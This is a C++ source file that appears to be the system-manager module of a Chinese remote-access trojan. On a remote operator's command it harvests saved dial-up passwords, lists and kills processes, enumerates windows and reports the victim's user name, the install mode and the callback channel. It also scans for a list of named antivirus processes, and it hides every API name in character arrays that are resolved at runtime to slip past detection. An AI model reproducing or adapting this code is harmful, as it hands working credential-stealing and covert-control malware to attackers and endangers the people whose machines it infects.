// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////
#include "../stdafx.h"
#include "../Declare.h"   //动态调用库函数
#include "SystemManager.h"
#include "Dialupass.h"

#include <tlhelp32.h>
#include <psapi.h>
#pragma comment(lib,"Psapi.lib")

#include "until.h"
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;
//////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////////////////
CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient)
{
	SendProcessList();
}

CSystemManager::~CSystemManager()
{

}
void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_SYSTEMINFO:
		GetSystemInfo();
		break;
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:  // 拨号密码
		SendDialupassList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
	default:
		break;
	}
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	Send((LPBYTE)lpBuffer, pLocalSize(lpBuffer));
	pLocalFree(lpBuffer);
}

void CSystemManager::SendWindowsList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	Send((LPBYTE)lpBuffer, pLocalSize(lpBuffer));
	pLocalFree(lpBuffer);	
}

void CSystemManager::SendDialupassList()
{
	CDialupass	pass;

	int	nPacketLen = 0;
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	int i;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += plstrlenA(pOneInfo->Get(j)) + 1;
	}

	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)pLocalAlloc(LPTR, nPacketLen);
	
	DWORD	dwOffset = 1;

	for (i = 0; i < pass.GetMax(); i++)
	{

		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = plstrlenA(pOneInfo->Get(j)) + 1;
			Gyfunction->my_memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}

	lpBuffer[0] = TOKEN_DIALUPASS;
	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	Send((LPBYTE)lpBuffer, pLocalSize(lpBuffer));
	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	pLocalFree(lpBuffer);
	
}
void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	
	char FBwWp14[] = {'O','p','e','n','P','r','o','c','e','s','s','\0'};
	OpenProcessT pOpenProcess=(OpenProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp14);
	char FBwWp15[] = {'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s','\0'};
	TerminateProcessT pTerminateProcess=(TerminateProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp15);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	for (unsigned int i = 0; i < nSize; i += 4)
	{
		hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
		pTerminateProcess(hProcess, 0);
		pCloseHandle(hProcess);
	}

	// 稍稍Sleep下，防止出错
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	pSleep(100);
	// 刷新进程列表
	SendProcessList();
	// 刷新窗口列表
	SendWindowsList();	
}

LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	
	char SSzlC11[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char SSzlC10[] = {'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t','\0'};
	CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot= (CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary(SSzlC11),SSzlC10);
	hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
	lpBuffer = (LPBYTE)pLocalAlloc(LPTR, 1024);
	
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary(SSzlC11),"LocalSize");
	char FBwWp14[] = {'O','p','e','n','P','r','o','c','e','s','s','\0'};
	OpenProcessT pOpenProcess=(OpenProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp14);
	char MyProcess32Next[] ={'P','r','o','c','e','s','s','3','2','N','e','x','t','\0'};
	Process32NextT pProcess32Next= (Process32NextT)GetProcAddress(LoadLibrary(SSzlC11),MyProcess32Next);
	char MyProcess32First[] ={'P','r','o','c','e','s','s','3','2','F','i','r','s','t','\0'};
	Process32FirstT pProcess32First= (Process32FirstT)GetProcAddress(LoadLibrary(SSzlC11),MyProcess32First);
	char FBwWp29[] = {'L','o','c','a','l','R','e','A','l','l','o','c','\0'};
	LocalReAllocT pLocalReAlloc=(LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp29);

	char DYrEN15[] = {'E','n','u','m','P','r','o','c','e','s','s','M','o','d','u','l','e','s','\0'};
	EnumProcessModulesT pEnumProcessModules=(EnumProcessModulesT)GetProcAddress(LoadLibrary("PSAPI.DLL"),DYrEN15);
	char DYrEN13[] = {'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','E','x','A','\0'};
	GetModuleFileNameExAT pGetModuleFileNameExA=(GetModuleFileNameExAT)GetProcAddress(LoadLibrary("PSAPI.DLL"),DYrEN13);
	if(pProcess32First(hSnapshot, &pe32))
	{	  
		do
		{      
			hProcess = pOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				pEnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				pGetModuleFileNameExA(hProcess, hModules, strProcessName, sizeof(strProcessName));
				
				// 此进程占用数据大小
				dwLength = sizeof(DWORD) + plstrlenA(pe32.szExeFile) + plstrlenA(strProcessName) + 2;
				// 缓冲区太小，再重新分配下
				if (pLocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)pLocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				Gyfunction->my_memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				Gyfunction->my_memcpy(lpBuffer + dwOffset, pe32.szExeFile, plstrlenA(pe32.szExeFile) + 1);
				dwOffset += plstrlenA(pe32.szExeFile) + 1;
				
				Gyfunction->my_memcpy(lpBuffer + dwOffset, strProcessName, plstrlenA(strProcessName) + 1);
				dwOffset += plstrlenA(strProcessName) + 1;
			}
		}

		while(pProcess32Next(hSnapshot, &pe32));
	}
	
	lpBuffer = (LPBYTE)pLocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hSnapshot);
	return lpBuffer;	
}

BOOL DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	char CtxPW35[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n','\0'};
	OpenProcessTokenT pOpenProcessToken=(OpenProcessTokenT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW35);
    char Wffkl01[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0'};
    GetCurrentProcessT pGetCurrentProcess=(GetCurrentProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl01);
	if (!pOpenProcessToken(pGetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
    char CtxPW34[] = {'L','o','o','k','u','p','P','r','i','v','i','l','e','g','e','V','a','l','u','e','A','\0'};
    LookupPrivilegeValueAT pLookupPrivilegeValueA=(LookupPrivilegeValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW34);
	pLookupPrivilegeValueA(NULL, PName, &TokenPrivileges.Privileges[0].Luid);

    char CtxPW33[] = {'A','d','j','u','s','t','T','o','k','e','n','P','r','i','v','i','l','e','g','e','s','\0'};
    AdjustTokenPrivilegesT pAdjustTokenPrivileges=(AdjustTokenPrivilegesT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW33);
	pAdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	char FBwWp06[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	GetLastErrorT pGetLastError=(GetLastErrorT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp06);
    if (pGetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hToken);
	return bResult;	
}

void CSystemManager::ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);

    char CtxPW56[] = {'E','x','i','t','W','i','n','d','o','w','s','E','x','\0'};
    ExitWindowsExT pExitWindowsEx=(ExitWindowsExT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW56);
	pExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}

bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;
	
	char	strTitle[1024];
	memset(strTitle, 0, sizeof(strTitle));

    char CtxPW56[] = {'G','e','t','W','i','n','d','o','w','T','e','x','t','A','\0'};
    GetWindowTextAT pGetWindowTextA=(GetWindowTextAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW56);
	pGetWindowTextA(hwnd, strTitle, sizeof(strTitle));
	
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	char DYrEN52[] = {'I','s','W','i','n','d','o','w','V','i','s','i','b','l','e','\0'};
	IsWindowVisibleT pIsWindowVisible=(IsWindowVisibleT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN52);
	if (!pIsWindowVisible(hwnd) || plstrlenA(strTitle) == 0)
		return true;
	
	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
	if (lpBuffer == NULL)
		lpBuffer = (LPBYTE)pLocalAlloc(LPTR, 1);
	
	dwLength = sizeof(DWORD) + plstrlenA(strTitle) + 1;
	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	dwOffset = pLocalSize(lpBuffer);
	char FBwWp29[] = {'L','o','c','a','l','R','e','A','l','l','o','c','\0'};
	LocalReAllocT pLocalReAlloc=(LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp29);
	lpBuffer = (LPBYTE)pLocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
    char CtxPW53[] = {'G','e','t','W','i','n','d','o','w','T','h','r','e','a','d','P','r','o','c','e','s','s','I','d','\0'};
    GetWindowThreadProcessIdT pGetWindowThreadProcessId=(GetWindowThreadProcessIdT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW53);
	pGetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	Gyfunction->my_memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, plstrlenA(strTitle) + 1);
	
	*(LPBYTE *)lParam = lpBuffer;
	
	return true;
}

LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	char DYrEN66[] = {'E','n','u','m','W','i','n','d','o','w','s','\0'};
	EnumWindowsT pEnumWindows=(EnumWindowsT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN66);
	pEnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}

///////////////////////////////////////////杀毒显示////////////////////////////////////

char* GetVirus()
{	
	static char AllName[256] = "";
	//360安全								卡巴						江民
	char* VirusName = "360tray.exe"; char* VirusName1 = "avp.exe"; char* VirusName2 = "KvMonXP.exe";
	//瑞星									360杀毒						麦咖啡
	char* VirusName3 = "RavMonD.exe";	char* VirusName4 = "360sd.exe"; char* VirusName5 = "Mcshield.exe"; 
	//NOD32									金山						可牛
	char* VirusName6 = "egui.exe"; char* VirusName7 = "kxetray.exe"; char* VirusName8 = "knsdtray.exe";
	//趋势  								小红伞						avast
	char* VirusName9 = "TMBMSRV.exe"; char* VirusName10 = "avcenter.exe"; char* VirusName11 = "ashDisp.exe";

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(AllName,"%s","");   //

	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	if (GetProcessID(VirusName)) 
	{
		VirusName = "360安全卫士";
		plstrcatA( AllName, VirusName); // 
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName1))
	{	
		VirusName1 = "卡巴";
		plstrcatA( AllName, VirusName1 ); 
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName2))
	{	
		VirusName2 = "江民";
		plstrcatA( AllName, VirusName2 );
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName3))
	{	
		VirusName3 = "瑞星";
		plstrcatA( AllName, VirusName3 );
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName4))
	{	
		VirusName4 = "360杀毒";
		plstrcatA( AllName, VirusName4 );
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName5))
	{	
		VirusName5 = "麦咖啡";
		plstrcatA( AllName, VirusName5 );
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName6))
	{	
		VirusName6 = "NOD32";
		plstrcatA( AllName, VirusName6 );
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName7))
	{	
		VirusName7 = "金山";
		plstrcatA( AllName, VirusName7 );
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName8))
	{	
		VirusName8 = "可牛";
		plstrcatA( AllName, VirusName8 );
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName9))
	{	
		VirusName9 = "趋势";
		plstrcatA( AllName, VirusName9 );
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName10))
	{	
		VirusName10 = "小红伞";
		plstrcatA( AllName, VirusName10 );
		plstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName11))
	{	
		VirusName11 = "Avast";
		plstrcatA( AllName, VirusName11 );
		plstrcatA( AllName, " " );
	}

	if (Gyfunction->my_strstr(AllName, " " )  == 0 )
	{	
		plstrcatA(AllName , "未发现 ");

	}

	return AllName;
}

//=========================================================
BOOL GetTokenByName(HANDLE &hToken,LPSTR lpName)
{
    if(!lpName)
	{
        return FALSE;
	}
    HANDLE         hProcessSnap = NULL; 
    BOOL           bRet      = FALSE; 
    PROCESSENTRY32 pe32      = {0}; 

	char SSzlC11[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char SSzlC10[] = {'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t','\0'};
	CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot= (CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary(SSzlC11),SSzlC10);
    hProcessSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) 
        return (FALSE); 

    pe32.dwSize = sizeof(PROCESSENTRY32); 
	char MyProcess32First[] ={'P','r','o','c','e','s','s','3','2','F','i','r','s','t','\0'};
	Process32FirstT pProcess32First= (Process32FirstT)GetProcAddress(LoadLibrary(SSzlC11),MyProcess32First);
	char CtxPW35[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n','\0'};
	OpenProcessTokenT pOpenProcessToken=(OpenProcessTokenT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW35);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	char FBwWp14[] = {'O','p','e','n','P','r','o','c','e','s','s','\0'};
	OpenProcessT pOpenProcess=(OpenProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp14);
	char MyProcess32Next[] ={'P','r','o','c','e','s','s','3','2','N','e','x','t','\0'};
	Process32NextT pProcess32Next= (Process32NextT)GetProcAddress(LoadLibrary(SSzlC11),MyProcess32Next);
    if (pProcess32First(hProcessSnap, &pe32)) 
    {
        do 
        {
            if(!strcmp(_strupr(pe32.szExeFile),_strupr(lpName)))
			{
                HANDLE hProcess = pOpenProcess(PROCESS_QUERY_INFORMATION,FALSE,pe32.th32ProcessID);
//                bRet = pOpenProcessToken(hProcess,TOKEN_ALL_ACCESS,&hToken);
				bRet = pOpenProcessToken(hProcess,TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken);
                pCloseHandle (hProcessSnap); 
                return (bRet);
			}
        } 
        while (pProcess32Next(hProcessSnap, &pe32)); 
        bRet = TRUE; 
    } 
    else 
        bRet = FALSE;

    pCloseHandle (hProcessSnap); 
    return (bRet);
}

//=================获得当前登陆用户名及计算机名称====================
BOOL GetCurrentUserName(char szUser[],char szDomain[])
{
    HANDLE hToken;

    //得到shell的token
    if(!GetTokenByName(hToken,"EXPLORER.EXE"))
	{
        return FALSE;
	}
    DWORD        cbti     = 0;
    PTOKEN_USER  ptiUser  = NULL;
    SID_NAME_USE snu;

    //取得所需空间大小
	char JwFNw01[] = {'G','e','t','T','o','k','e','n','I','n','f','o','r','m','a','t','i','o','n','\0'};
	GetTokenInformationT pGetTokenInformation=(GetTokenInformationT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw01);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
    if (pGetTokenInformation(hToken, TokenUser, NULL, 0, &cbti)) 
	{
        pCloseHandle(hToken);
        return FALSE;
	}

    //分配空间
	char JwFNw02[] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0'};
	GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw02);
	char JwFNw03[] = {'H','e','a','p','A','l','l','o','c','\0'};
	HeapAllocT pHeapAlloc=(HeapAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw03);
    ptiUser = (PTOKEN_USER) pHeapAlloc(pGetProcessHeap(), 0, cbti);

    if(!ptiUser)
	{
        pCloseHandle(hToken);
        return FALSE;
	}

    //取得token信息
	char JwFNw05[] = {'H','e','a','p','F','r','e','e','\0'};
	HeapFreeT pHeapFree=(HeapFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw05);
    if (!pGetTokenInformation(hToken, TokenUser, ptiUser, cbti, &cbti))
	{
        pCloseHandle(hToken);
        pHeapFree(pGetProcessHeap(), 0, ptiUser);
        return FALSE;
	}

    DWORD nUser = 50;
    DWORD nDomain = 50;

    //根据用户的sid得到用户名和domain
	char JwFNw06[] = {'L','o','o','k','u','p','A','c','c','o','u','n','t','S','i','d','A','\0'};
	LookupAccountSidAT pLookupAccountSidA=(LookupAccountSidAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw06);
    if (!pLookupAccountSidA(NULL, ptiUser->User.Sid, szUser, &nUser, szDomain, &nDomain, &snu))
	{
        pCloseHandle(hToken);
        pHeapFree(pGetProcessHeap(), 0, ptiUser);
        return FALSE;
	}

    pCloseHandle(hToken);
    pHeapFree(pGetProcessHeap(), 0, ptiUser);

    return TRUE;
}
void GetCurrentUserNamet(char szUser[])
{
	char TszUser[50]={0};
	char TszDomain[50]={0};
    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	if(GetCurrentUserName(TszUser,TszDomain))
	{
		pwsprintfA(szUser,"%s",TszUser);
	}
	else
	{
		pwsprintfA(szUser,"%s","无用户登陆状态！");
	}
}

void CSystemManager::GetSystemInfo()
{
	MESSAGEInfo Infomsg;
	//获取操作系统相关信息
	Infomsg.bToken = TOKEN_SYSTEMINFO; 
	//////////////CPU Speed/////////////////
	DWORD dwCpu, dwBufLen;
	HKEY hKey;
	char JYvni02[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0'};
	char HrFvD07[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
    RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD07);
	pRegOpenKeyExA( HKEY_LOCAL_MACHINE,
		JYvni02,
		0, KEY_QUERY_VALUE, &hKey );
	dwBufLen = sizeof(DWORD);
	char HrFvD13[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A','\0'};
	RegQueryValueExAT pRegQueryValueExA=(RegQueryValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegQueryValueExA");
	pRegQueryValueExA( hKey, ("~MHz"), NULL, NULL,(LPBYTE)&dwCpu, &dwBufLen);

	char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
	pRegCloseKey(hKey);

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(Infomsg.szCpuSpeend,("~%u MHz"), dwCpu);
	//Get CPU Info===============================
	CHAR SubKey[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0','\0'};
//	CHAR SubKey[MAX_PATH]=("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\0");
	hKey = NULL;
	if(pRegOpenKeyExA(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
	{
		DWORD dwType;
		DWORD dwSize = 128 * sizeof(TCHAR);
		pRegQueryValueExA(hKey,("ProcessorNameString"),NULL,&dwType,(BYTE *)Infomsg.szCpuInfo,&dwSize);
		pRegCloseKey(hKey);	
	}


	//Get Computer & User Name========================
	DWORD dwLen = sizeof(Infomsg.szPcName);

	char CPolQ16[] = {'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A','\0'};
	GetComputerNameAT pGetComputerNameA=(GetComputerNameAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ16);
	pGetComputerNameA(Infomsg.szPcName, &dwLen);
/*
	dwLen = sizeof(Infomsg.szUserName);
	GetUserName(Infomsg.szUserName,&dwLen);   //获取当前用户名
	*/
	//获取当前用户名及计算机名称
	GetCurrentUserNamet(Infomsg.szUserName);

	//Get Screen Size=================================
	char DYrEN67[] = {'G','e','t','S','y','s','t','e','m','M','e','t','r','i','c','s','\0'};
	GetSystemMetricsT pGetSystemMetrics=(GetSystemMetricsT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN67);
	pwsprintfA(Infomsg.szScrSize, ("%d * %d"), pGetSystemMetrics(SM_CXSCREEN),pGetSystemMetrics(SM_CYSCREEN));

//	UINT Porst =dwPort[nConnect];
	if(nConnect==0)
	    pwsprintfA(Infomsg.LineName,"域名上线：%s",lpConnects[0]);  //域名上线写入
	if(nConnect==1)
	    pwsprintfA(Infomsg.LineName,"QQ上线：%s",lpConnects[1]);    //QQ上线写入
	if(nConnect==2)
	    pwsprintfA(Infomsg.LineName,"网盘上线：%s",lpConnects[2]);  //网盘上线写入

	pwsprintfA(Infomsg.LinePort,"%d",dwPort[nConnect]);     //上线端口写入

	char LCoHX03[] = {'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','A','\0'};
	GetModuleFileNameAT pGetModuleFileNameA=(GetModuleFileNameAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),LCoHX03);
	char szbuf[256];
	pGetModuleFileNameA(NULL,szbuf,MAX_PATH);   //用于获取程序本身路径

	pwsprintfA(Infomsg.Program,"%s",szbuf );   

	if(Installope==0)  //绿色一次性运行
	{
	    pwsprintfA(Infomsg.InstallOpen,"%s","(绿色运行)--重启不上线!");     //上线运行方式
	}
	else if(Installope==1)  // 服务启动运行
	{
		pwsprintfA(Infomsg.InstallOpen,"%s","(服务启动)--SYSTEM用户运行!");     //上线运行方式
	}
	else if(Installope==2)  // 直接启动运行
	{
		pwsprintfA(Infomsg.InstallOpen,"%s","(直接启动)--当前用户运行!");      //上线运行方式
	}

	pwsprintfA(Infomsg.szUserVirus,"%s",GetVirus());   //杀毒软件


	Send((LPBYTE)&Infomsg, sizeof(MESSAGEInfo));
}

